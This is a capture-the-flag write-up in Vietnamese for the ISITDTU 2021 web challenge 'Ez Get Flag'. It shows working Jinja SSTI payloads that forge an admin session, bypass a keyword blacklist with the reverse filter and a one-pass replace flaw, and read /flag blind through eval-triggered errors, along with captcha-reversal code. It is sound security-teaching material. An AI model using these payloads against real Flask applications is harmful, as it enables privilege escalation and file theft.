# Ez Get Flag

![image](https://user-images.githubusercontent.com/61876488/144171174-1bc9f1fc-4d19-4386-80f7-3a1846a2d928.png)

[Source](https://drive.google.com/file/d/1taM2xhzuIEPIbrsaOYpFzspFhx1CrEx-/view)

### 1. Initial reconnaissance:

Thoạt nhìn thì ai cũng tưởng sẽ phải vào `register` để tạo một account mới rồi login vào, nhưng đời không đơn giản như vậy. Nó thậm chí còn không cho register!

![](https://i.imgur.com/WeqF3R8.png)

Khi nhập linh tinh vào các field của trang `login` thì nó sẽ ra như này:

![](https://i.imgur.com/1wvQfnD.png)

Check source của bài này thì chỉ có 2 trang `register` và `login` này cho phép free-access. Như vậy chúng ta chỉ còn cách bypass login để mà vào bên trong. 

### 2. Bypass login:

Ta có source của chức năng login như sau:

```python
def login():
	if 'username' in session:
		return redirect(url_for('home'))
    
	else:
		if request.method == "POST":
			username, password = '', ''
			username = request.form['username']
			password = request.form['password']
			
            if sql.login_check(username,password) > 0 and username == 'admin':
				session['username'] = 'admin'
				session['check'] = 1
				return render_template('home.html')

			else:
				cc, secret = '', ''
				cc = request.form['captcha']
				secret = request.form['secret']
				
                if captcha.check_captcha(cc):
					session['username'] = 'guest'
					session['check'] = 0
					session['sr'] = secret
					return redirect(url_for('home'))

			return render_template('login.html', msg='Ohhhh Noo - Incorrect !')

		return render_template('login.html')
```

Từ source ta có thể tóm tắt các thức hoạt động của trang `login` như sau:

- Web app này có 2 role là `admin` và `guest`, và kiểm tra user thuộc role nào thông qua object `session`.
- Dù user là `admin` hay `guest` thì sau khi login xong đều được redirect đến trang `home`. Điểm khác biệt ở đây là `admin` sẽ có `session['check'] = 1` còn `guest` thì có `session['check'] = 0` kèm theo đó là `session['sr'] = secret`, với biến `secret` được nhập vào từ field `Secret (option)` của login form.

Điều kiện để có thể login như một `admin` đó là `sql.login_check(username,password) > 0` và `username == 'admin'`. Check hàm `login_check` xem sao:

```python
def login_check(username, password):

	conn = sqlite3.connect('database/users.db')

	row = conn.execute("SELECT * from users where username = ? and password = ?", (username, hashlib.sha1(password.encode()).hexdigest(), )).fetchall()

	return len(row)
```

Như vậy chức năng login sẽ connect với `database/users.db` và query từ table `users` để check. Theo yêu cầu thứ 2 thì `admin` cần có `username == 'admin'` nhưng khi check `database/users.db` thì lại chỉ có 1 row như này:

![](https://i.imgur.com/vEn8DbC.png)

Cột password trong table `users` đã bị hash. Mà kể cả chúng ta có crack được hash này thì `username` sẽ là `taidh` chứ không phải `admin`, bỏ phương án crack hash này đi cho đỡ mất công.

Quay sang tìm cách để trở thành `guest`. Điều kiện để có thể login như một `guest` đó là `captcha.check_captcha(cc) == True`. Mặc kệ các field còn lại là `username`, `password`, `secret (option)` có như thế nào, chỉ cần nhập đúng captcha vào field `Captcha` là vào được trang `home`. Check hàm `check_captcha` xem sao:

```python
SECRET = '[CENSORED]' # this is captcha
CHECK = '203c0617e3bde7ec99b5b657417a75131e3629b8ffdfdbbbbfd02332'

def check_captcha(cc):
	msg = b'hello '
	msg += cc.encode()
	if calculate(msg) == CHECK:
		return True
	return False

def calculate(msg):
	c = []
	a = ord(b'[CENSORED]')
	b = ord(b'[CENSORED]')
	for m in msg:
		c.append(a ^ m)
		a = (a + b) % 256
	return bytes(c).hex()
```

Biến `cc` sau khi truyền vào hàm `check_captcha` sẽ được concat với giá trị [IV](https://en.wikipedia.org/wiki/Initialization_vector) là biến msg (`msg = b'hello '`), sau đó cho tất cả vào hàm `calculate` để gen ra một đoạn mã `SECRET`, và `SECRET` phải giống y như biến `CHECK`. Bài toán đặt ra cho chúng ta là: "Tìm 2 giá trị a và b, cho biết giá trị IV và CHECK".

Phân tích hàm `caculate` thì ta biết được `SECRET` được tạo ra như sau:

- Tạo một list rỗng `c`, sau đó qua mỗi vòng lặp `for m in msg` sẽ append thêm `a^m` (a XOR m), đồng thời giá trị a sẽ liên tục thay đổi sau 1 vòng lặp theo công thức `a = (a + b) % 256`.

- Sau khi đã append hết thì list `c` sẽ được convert sang dạng bytes và cuối cùng là một string chứa các giá trị hex.

![](https://i.imgur.com/ngly34K.png)

List `c` và hex string `'01020304050607'` chỉ mang tính chất minh họa, trên thực tế thì phải là `bytes(c).hex() == CHECK`. Lật ngược vấn đề, từ biến `CHECK` đã cho chúng ta có thể tìm ra list `c`? Giải pháp là sử dụng hàm [fromhex](https://pythontic.com/containers/bytes/fromhex):

![](https://i.imgur.com/T9g68IH.png)

Từ vòng lặp `for m in msg:` thứ nhất ta có `c[0] = a₀ ^ m₀ ⟺ c[0] = a ^ msg[0]`, tìm ra được `a = 72 = ord('H')`. Sang vòng lặp thứ 2, ta lại có `c[1] = a₁ ^ m₁ ⟺ c[1] = a₁ ^ msg[1] ⟺ a₁ = 60 ^ 101 = 89`, từ `a₁` và `a₀` tìm ra được `b = 17 = ord('\x11')` theo công thức: `a₁ = (a₀+b) % 256`.

Tìm được a và b thì coi như bài toán đã kết thúc, chúng ta chỉ chạy một vòng lặp tương tự của hàm `calculate`, nhưng thay vì cho a đi xor với từng bytes của msg thì ta xor thẳng với `CHECK`:

```python
def gen_captcha():
	SECRET = '[CENSORED]' # this is captcha
	CHECK = '203c0617e3bde7ec99b5b657417a75131e3629b8ffdfdbbbbfd02332'
	head = b'hello '
	array_check = list(bytes.fromhex(CHECK))
	ord_a = array_check[0] ^ head[0]
	ord_b = (array_check[1] ^ head[1]) - ord_a
	head_secret = '' 

	for r in array_check:
		head_secret += chr(ord_a ^ r)
		ord_a = (ord_a + ord_b) % 256
	if head.decode('utf-8') in head_secret:
		SECRET = head_secret.replace(head.decode('utf-8'), '')
	return SECRET	
```

Chạy script ta có `SECRET = ISITDTU_CTF_S3cret_!!!`, nhập captcha này vào login form chúng ta sẽ vào được `home`:

![](https://i.imgur.com/GSRgHAs.png)


### 3. Privilege escalation to become admin:

Để ý vào dòng "Your secret: ..." ở chức năng `home`. Nó sẽ trả về những gì chúng ta nhập vào tại field `Secret (option)` thông qua template engine của web app là [Jinja](https://jinja.palletsprojects.com/en/3.0.x/). Liệu nó có bị dính SSTI hay không? Câu trả lời là không vì chức năng này đang sử dụng hàm [render_template](https://www.fullstackpython.com/flask-templating-render-template-examples.html) để đẩy **dynamic content** từ biến `secret` vào một **static template file** là `home.html`.

```python
# home function
@app.route('/home')
def home():
	if 'username' in session:
		secret = session['sr']
		return render_template('home.html', secret=secret)
	return redirect(url_for('login'))
```

```htmlembedded=
<!-- home.html -->
{% if secret %}
<i><h3 class="jumbotron-heading">Your secret: {{secret}}</h3></i>
{% endif %}
```

 Mà theo một [bài research của PortSwigger về SSTI](https://portswigger.net/web-security/server-side-template-injection) thì:
 
 > Static templates that simply provide placeholders into which dynamic content is rendered are generally not vulnerable to server-side template injection.

Tuy vậy, trong quá trình research các hàm dùng để render content của web app này thì mình phát hiện trong source có một đoạn tác giả không sử dụng hàm render_template, thay vào đó là render_template_string (xem sự khác nhau giữa 2 hàm render này tại [đây](https://www.programmerall.com/article/2281890402/)), nằm ở chức năng `rate`:

```python
if session['username'] == 'admin' and session['check'] == 1:
	picture = picture.replace('{{','{').replace('}}','}').replace('>','').replace('#','').replace('<','')
	if waf.isValid(picture):
		render_template_string(picture)
	return 'you are admin you can choose all :)'

else:
	_waf = ['{{','+','~','"','_','|','\\','[',']','#','>','<','!','config','==','}}']
	for char in _waf:
		if char in picture:
			picture = picture.replace(char,'')
	if waf.check_len(picture):
		render_template_string(picture)
	return 'you are wonderful ♥'
```

Chức năng `rate` ở 2 role `admin` và `guest` đều hoạt động giống như nhau, đều `render_template_string(picture)` ở cuối, nhưng ở role `admin` thì biến `picture` bị filter nhẹ tay hơn so với ở role `guest` (bạn có thể kiếm tra 2 hàm **check_len** và **isValid** trong [waf.py](https://github.com/antoinenguyen-09/All_CTF_write-ups/blob/master/ISITDTU%20CTF/2021/web/ez%20get%20flag/source/files/lib/waf.py) là thấy rõ). Do đó hướng đi của mình là privilege escalate lên admin bằng SSTI cho dễ thở. Lí do tại sao truyền thẳng một string vào hàm render_template_string lại có thể gây ra SSTI thì các bạn có thể đọc tại [đây](https://sl1nki.page/blog/2021/01/24/ssti). Mình xin được đi thẳng vào luôn phần bypass và exploit, vì endpoint bị dính SSTI đã hiện ra ngay tại đây rồi:

![](https://i.imgur.com/BRG26Ii.png)

Vấn đề là chúng ta phải bypass được cái black list `_waf`của guest:

```python
_waf = ['{{','+','~','"','_','|','\\','[',']','#','>','<','!','config','==','}}']
```

Trước mắt chúng ta thấy "{{...}}", vốn dùng để biểu diễn một [expression](https://jinja.palletsprojects.com/en/3.0.x/templates/#expressions) trong Jinja đã bị blacklist. Nhưng chúng ta vẫn có thể dùng "{%...%}" - [control statement](https://jinja.palletsprojects.com/en/3.0.x/templates/#list-of-control-structures) để làm vài trò hay ho, trong đó có [gán giá trị cho các template variable](https://jinja.palletsprojects.com/en/3.0.x/templates/#assignments). Thông thường thì các template variable của jinja ở phía front end sẽ độc lập hoàn toàn với các variable **cùng tên** của python ở phía back end, khi có 2 điều kiện được thỏa mãn là variable cùng tên đó của Python **không được truyền** vào template variable của Jinja thông qua các **hàm render** và trong **control statement** của Jinja **không có một variable cùng tên** được khai báo. Lấy 2 đoạn code kèm output tương ứng của nó như sau làm ví dụ:

```python
# case 1
from flask import Flask, render_template_string
app = Flask(__name__)

@app.route('/')
def home():
    name = 'antoine' # variable "name" in Python
    picture = """{{name}}""" #  template variable "name" in Jinja 
    print(name)   # output: "antoine"
    return render_template_string(picture, name=name) # variable "name" in Python is passed to template variable "name" in Jinja.

if __name__ == '__main__':
    app.run(debug=True)
```
![](https://i.imgur.com/xLr6dnD.png)

```python
# case 2
from flask import Flask, render_template_string
app = Flask(__name__)

@app.route('/')
def home():
    name = 'antoine' # variable "name" in Python
    picture = """{%set name='nguyen'%}{{name}}""" #  template variable "name" in Jinja
    print(name)   # output: "antoine"
    return render_template_string(picture, name=name) # variable "name" in Python is passed to template variable "name" in Jinja. However, there is a variable "name" initialized and assigned with "nguyen" in control statement of Jinja, so the template displayed as following.

if __name__ == '__main__':
    app.run(debug=True)
```

![](https://i.imgur.com/PI8J2IR.png)

Trường hợp tương tự cũng xảy ra với các instance được tạo từ các subclass của module Flask như [session](https://flask.palletsprojects.com/en/2.0.x/quickstart/#sessions).

```python
# session saved in server side.
from flask import Flask, render_template_string, session
app = Flask(__name__)
app.config['SECRET_KEY'] = 'antoine'

@app.route('/')
def home():
    session['username'] = 'guest'
    session['check'] = 0
    picture = """{%set a=session.update({'username':'admin','check':1})%}"""
    print(session) # output: {'check': 0, 'username': 'guest'}
    return render_template_string(picture)

if __name__ == '__main__':
    app.run(debug=True)
```

![](https://i.imgur.com/K8oBdlf.png)

Theo lời chú thích ở ảnh thì chúng ta hoàn toàn có thể gửi cookie đã bị thay đổi và privilege escalate lên admin bằng payload sau:

```
{%set a=session.update({'username':'admin','check':1})%}
```
Submit rồi refresh lại trang, chúng ta sẽ thấy dòng này thay vì "you are wonderful ♥":

![](https://i.imgur.com/WRu213a.png)

### 4. Exploit Blind SSTI by triggering error and get the flag

Như vậy công việc cuối cùng của chúng ta là tìm cách đọc được file `flag`. Tuy nhiên, lại xuất hiện thêm một khó khăn nữa, đó là những gì xuất hiện trên response sẽ được Flask trả về dựa trên kết quả của câu lệnh `return`. Mà thứ chúng ta cần là `render_template_string(picture)` thì nó lại không được `return`. Do đó chúng ta không thể một phát đọc luôn nội dung của flag.

```python
if waf.isValid(picture):
	render_template_string(picture)  # this won't never be appear in response :(
return 'you are admin you can choose all :)' # this will always appear in response!
```

Đã từng thấy Blind SQL Injection, Blind Command Injection,... nhưng đây là lần đầu tiên mình thấy Blind SSTI =)))). Về cơ bản thì hầu hết các vuln Blind Injection đều có các case khai thác phổ biến như trigger time delays, errors, out-of-band,... Mình quyết định khai thác case Blind SSTI bằng cách trigger errors, vì nó dễ viết code khai thác:v: 

Trước hết, mọi ý tưởng về khai thác SSTI đều hướng tới mục đích cuối cùng là bypass python sandbox (python jail), từ "không có gì" cho đến gọi được các hàm "nguy hiểm" dùng để đọc file, chạy command, đồng nghĩa với RCE thành công (các bạn có thể xem một bài viết của tôi về [escape python jail](https://ethical-h4ckers-club.blogspot.com/2020/11/fpt-uni-secathon-3-misc-writeup-prp301.html)). Python sandbox ở đây mà chúng ta cần bypass ở đây chính là Jinja, vì mặc dù Jinja có syntax khá giống Python, cho phép nhúng code Python vào nhưng bản chất nó không phải là Python. Bạn sẽ hiểu điều này khi nghiên cứu về [Jinja API](https://jinja.palletsprojects.com/en/3.0.x/api). Về cơ bản thì API của Jinja được chia thành **High Level API** và **Low Level API**, và các API này đều có thể gọi được trong Python bằng cách `from jinja2 import <module's name>`:

>The high-level API is the API you will use in the application to load and render Jinja templates. The Low Level API on the other side is only useful if you want to dig deeper into Jinja or develop extensions.

Trong high-level API có một class rất đặc biệt là `jinja2.Undefined`:

>These classes can be used as undefined types. The Environment constructor takes an undefined parameter that can be one of those classes or a custom subclass of Undefined. Whenever the template engine is unable to look up a name or access an attribute one of those objects is created and returned. Some operations on undefined values are then allowed, others fail.

Ví dụ về một instance của class `jinja2.Undefined`:

```python
from jinja2 import Template

msg = Template("{{ module.type(t) }}").render(module=__builtins__)  # variable "t" in template wasn't initialize and Jinja engine is unable to look up íts name, so Jinja treat it as undefined class.
print(msg) # output: <class 'jinja2.runtime.Undefined'>
```

Mà theo mình nhớ trong Python thì tất cả mọi class đều có 1 magic method là [`__init__`](https://www.geeksforgeeks.org/__init__-in-python/) (giống như mọi class của Java đều phải có constructor vậy). Và class `jinja2.Undefined` cũng không phải ngoại lệ (các bạn có thể xem danh sách các method của class này tại [đây](http://code.nabla.net/doc/jinja2/api/jinja2/runtime/jinja2.runtime.Undefined.html#jinja2.runtime.Undefined)). Gọi được method `__init__` là đồng nghĩa với trở về dạng SSTI quen thuộc thường thấy trên [cheat sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#exploit-the-ssti-by-calling-ospopenread):

```
<object>.__init__.__globals__.__builtins__.<a builtins method in Python>
```

Bạn có thể đọc doc để hiểu rõ hơn về [`__builtins__`](https://docs.python.org/3/library/stdtypes.html?highlight=subclasses#built-in-types) và mình xin trích dẫn lại định nghĩa ngắn gọn về `__globals__` từ [đây](https://docs.python.org/3/reference/datamodel.html):

> A reference to the dictionary that holds the function’s global variables — the global namespace of the module in which the function was defined.

Nhưng vì cảm thấy game vẫn chưa đủ khó, tác giả đã blacklist luôn cả 2 `__globals__` và `__builtins__` :D

```python
BLACK_LIST = [
 'class', 'mro', 'base', 'request', 'app',
 'sleep', 'add', '+', 'config', 'subclasses', 'format', 'dict', 'get', 'attr', 'globals', 'time', 'read',
 'import', 'sys', 'cookies', 'headers', 'doc', 'url', 'encode', 'decode', 'chr', 'ord', 'replace', 'echo',
 'pop', 'builtins', 'self', 'template', 'print', 'exec', 'response', 'join', '{}', '%s', '\\', '*', '#', '&']
```

Nếu đọc cái `BLACK_LIST` này xong mà ta vẫn đâm đầu vào cheat sheat để kiếm một payload mới thì chắc là "No Hope!". Mình chợt nhớ ra trong Jinja có một "magic" cho phép thay đổi các template variable là [Filters](https://jinja.palletsprojects.com/en/3.0.x/templates/#filters), và trong số các "Filter" có [reverse](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.reverse) cho phép đảo ngược mọi thứ!

```python
from flask import Flask, render_template_string
app = Flask(__name__)

@app.route('/')
def home():
	picture = """{{ 'abc'|reverse }}"""
	return render_template_string(picture)

if __name__ == '__main__':
    app.run(debug=True)
```

![](https://i.imgur.com/z2SZe3n.png)

Do đó trong payload chúng ta chỉ cần tạo 2 template variable như này là bypass được `BLACK_LIST`. Sau đó tham khảo thêm cheat sheat ta gọi được hàm [eval](https://www.w3schools.com/python/ref_func_eval.asp) để bắt đầu chạy script :

```
{% set g='__slabolg__'|reverse%}{% set b='__snitliub__'|reverse%}{% set p=t.__init__[g][b]['eval']%}{{p(' s if str([i for i in open("/flag")])[s]=="char" else a',{'s':"index"|length})}}
```

Nói qua một chút về ý tưởng sử dụng `{{p(' s if str([i for i in open("/flag")])[s]=="char" else a',{'s':"index"|length})}}`. `p` đã được gán bằng method `eval`. Expression bên trong eval là:

```python
s if str([i for i in open("/flag")])[s]=="char" else a
```

Expression trên dịch nôm na ra theo tiếng Hooman là như này: mở file `/flag` ra rồi quét hết nội dung của nó (sử dụng [list comprehension](https://www.w3schools.com/python/python_lists_comprehension.asp)) cho vào array rồi convert tất cả thành string, nếu tại index `s` của string này có chứa kí tự `char` thì sẽ trả về biến `s`, server sẽ trả về status code 200, nếu không sẽ trả về biến `a`. Mà biến `a` chưa được khai báo lần nào trong expression này nên khi eval sẽ bị lỗi, server sẽ trả về status code 500. Để biến `s` có thể iterate qua string trên thì tại parameter "globals" của hàm eval chúng ta sẽ gán `s` bằng độ dài của string "index" (sử dụng Filter [length](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.length) để lấy độ dài), và độ dài của string `s` sẽ tăng thêm 1 sau mỗi vòng lặp.

Nếu bạn nghĩ đến đây là có thể build script rồi lấy flag ngon ăn thì nhầm rồi! Payload `{{p(' s if str([i for i in open("/flag")])[s]=="char" else a',{'s':"index"|length})}}` vẫn là chưa hợp lệ, vì trước khi được nạp vào hàm `render_template_string` nó sẽ bị sửa thành `{p(' s if str([i for i in open("/flag")])[s]=="char" else a',{'s':"index"|length})}`, do đó không còn là Jinja Expression và sẽ không chạy được:

```python
if session['username'] == 'admin' and session['check'] == 1:

	picture = picture.replace('{{','{').replace('}}','}').replace('>','').replace('#','').replace('<','')
```

Cách replace các kí tự bị cấm trong biến `picture` thành null này nhìn có vẻ an toàn, nhưng có một lỗ hổng nằm ở đoạn `replace('>','')` và `replace('<','')`. Chúng ta chỉ cần thêm 2 dấu '>' và '<' này vào giữa '{{' và '}}' bypass được luôn, vì nó chỉ replace có 1 lần thôi :D 

```
{% set g='__slabolg__'|reverse%}{% set b='__snitliub__'|reverse%}{% set p=t.__init__[g][b]['eval']%}{<{p(' s if str([i for i in open("/flag")])[s]=="char" else a',{'s':"index"|length})}>}
```
Các bạn có thể đọc exploit code của mình tại [đây](https://github.com/antoinenguyen-09/All_CTF_write-ups/blob/master/ISITDTU%20CTF/2021/web/ez%20get%20flag/exploit/exploit.py) rồi chạy thử.

Mặc dù vậy khi chạy exploit code chúng ta chỉ mới một nửa flag. Lí do nó spam các kí tự "a" ở cuối mà ko chịu in tiếp flag là vì theo exploit code thì string "index" sẽ được replace bằng một chuỗi "xxxx..." tăng dần, đồng nghĩa với độ dài payload sẽ liên tục tăng. Mà hàm isValid trong [waf.py](https://github.com/antoinenguyen-09/All_CTF_write-ups/blob/master/ISITDTU%20CTF/2021/web/ez%20get%20flag/source/files/lib/waf.py) chỉ cho phép payload dưới 202 kí tự:

```python
if countChar(picture) and len(picture) <= 202:
	...
```

Không sao cả, bạn chỉ cần thay đổi index của flag string từ `[s]` (iterate từ đầu đến cuối):

```
{% set g='__slabolg__'|reverse%}{% set b='__snitliub__'|reverse%}{% set p=t.__init__[g][b]['eval']%}{<{p(' s if str([i for i in open("/flag")])[s]=="char" else a',{'s':"index"|length})}>}
```
![](https://i.imgur.com/g4vVIOp.png)

Thành `[-s]` (iterate từ cuối lên đầu):

```
{% set g='__slabolg__'|reverse%}{% set b='__snitliub__'|reverse%}{% set p=t.__init__[g][b]['eval']%}{<{p(' s if str([i for i in open("/flag")])[-s]=="char" else a',{'s':"index"|length})}>}
```

![](https://i.imgur.com/7hbg4RW.png)

"Ez get flag" nhưng éo ez chút nào!!!! Flag cuối cùng là:

```
ISITDTU{A_FreE_FlaG_FOr_YoU_!!!!!!!!!!!_heHe}
```
